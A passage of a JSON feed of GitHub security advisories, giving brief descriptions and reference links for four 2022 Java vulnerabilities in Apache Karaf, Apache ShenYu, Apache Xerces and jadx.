            "content_html": "<p>Apache Karaf allows monitoring of applications and the Java runtime by using the Java Management Extensions (JMX). JMX is a Java RMI based technology that relies on Java serialized objects for client server communication. Whereas the default JMX implementation is hardened against unauthenticated deserialization attacks, the implementation used by Apache Karaf is not protected against this kind of attack. The impact of Java deserialization vulnerabilities strongly depends on the classes that are available within the targets class path. Generally speaking, deserialization of untrusted data does always represent a high security risk and should be prevented. The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path. It depends of system scoped classes (e.g. jar in the lib folder).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41766\">https://nvd.nist.gov/vuln/detail/CVE-2021-41766</a></li>\n<li><a href=\"https://karaf.apache.org/security/cve-2021-41766.txt\">https://karaf.apache.org/security/cve-2021-41766.txt</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=93a019c\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=93a019c</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=b42c82c\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=b42c82c</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/KARAF-7312\">https://issues.apache.org/jira/browse/KARAF-7312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jh5g-9m4v-9vv9\">https://github.com/advisories/GHSA-jh5g-9m4v-9vv9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jh5g-9m4v-9vv9",
            "title": "[org.apache.karaf:apache-karaf] Insecure Java Deserialization in Apache Karaf",
            "date_modified": "2022-01-28T22:24:48.000Z",
            "date_published": "2022-01-28T22:24:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jh5g-9m4v-9vv9"
            }
        },
        {
            "content_html": "<p>The HTTP response will disclose the user password. This issue affected Apache ShenYu 2.4.0 and 2.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23223\">https://nvd.nist.gov/vuln/detail/CVE-2022-23223</a></li>\n<li><a href=\"https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s\">https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/7\">http://www.openwall.com/lists/oss-security/2022/01/25/7</a></li>\n<li><a href=\"https://github.com/apache/incubator-shenyu/releases/tag/v2.4.2\">https://github.com/apache/incubator-shenyu/releases/tag/v2.4.2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/26/4\">http://www.openwall.com/lists/oss-security/2022/01/26/4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7wq4-89xx-g62j\">https://github.com/advisories/GHSA-7wq4-89xx-g62j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7wq4-89xx-g62j",
            "title": "[org.apache.shenyu:shenyu-common] Password exposure in ShenYu",
            "date_modified": "2022-02-02T16:15:03.000Z",
            "date_published": "2022-01-28T22:13:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7wq4-89xx-g62j"
            }
        },
        {
            "content_html": "<p>There's a vulnerability within the Apache Xerces Java (XercesJ) XML parser when handling specially crafted XML document payloads. This causes, the XercesJ XML parser to wait in an infinite loop, which may sometimes consume system resources for prolonged duration. This vulnerability is present within XercesJ version 2.12.1 and the previous versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23437\">https://nvd.nist.gov/vuln/detail/CVE-2022-23437</a></li>\n<li><a href=\"https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl\">https://lists.apache.org/thread/6pjwm10bb69kq955fzr1n0nflnjd27dl</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/24/3\">http://www.openwall.com/lists/oss-security/2022/01/24/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h65f-jvqw-m9fj\">https://github.com/advisories/GHSA-h65f-jvqw-m9fj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h65f-jvqw-m9fj",
            "title": "[xerces:xercesImpl] Infinite Loop in Apache Xerces Java",
            "date_modified": "2022-02-02T16:18:00.000Z",
            "date_published": "2022-01-27T16:13:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h65f-jvqw-m9fj"
            }
        },
        {
            "content_html": "<p>Improper Restriction of XML External Entity Reference in GitHub repository skylot/jadx prior to 1.3.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0219\">https://nvd.nist.gov/vuln/detail/CVE-2022-0219</a></li>\n<li><a href=\"https://github.com/skylot/jadx/commit/d22db30166e7cb369d72be41382bb63ac8b81c52\">https://github.com/skylot/jadx/commit/d22db30166e7cb369d72be41382bb63ac8b81c52</a></li>\n<li><a href=\"https://huntr.dev/bounties/0d093863-29e8-4dd7-a885-64f76d50bf5e\">https://huntr.dev/bounties/0d093863-29e8-4dd7-a885-64f76d50bf5e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r8j4-96mx-rjcc\">https://github.com/advisories/GHSA-r8j4-96mx-rjcc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r8j4-96mx-rjcc",
            "title": "[io.github.skylot:jadx-core] Improper Restriction of XML External Entity Reference in Skylot jadx",
            "date_modified": "2022-01-21T18:13:42.000Z",
            "date_published": "2022-01-21T18:13:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r8j4-96mx-rjcc"
            }
        }
    ]
}